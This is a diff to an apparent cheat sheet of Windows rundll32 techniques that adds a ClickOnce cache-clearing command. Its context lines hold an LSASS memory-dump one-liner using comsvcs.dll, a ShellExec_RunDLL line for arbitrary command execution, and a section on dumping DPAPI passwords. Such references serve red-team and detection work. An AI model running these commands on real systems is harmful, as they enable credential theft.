@@ -13,6 +13,11 @@ $id = Get-Process lsass; cd c:\tmp; copy C:\Windows\System32\comsvcs.dll <newNam
 rundll32.exe SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c <command>
 ```
 
+### Remove ClickOnce applications
+```
+rundll32 dfshim CleanOnlineAppCache
+```
+
 ### Dump passwords of DPAPI to file
 ```
 rundll32.exe keymgr.dll, KRShowKeyMgr
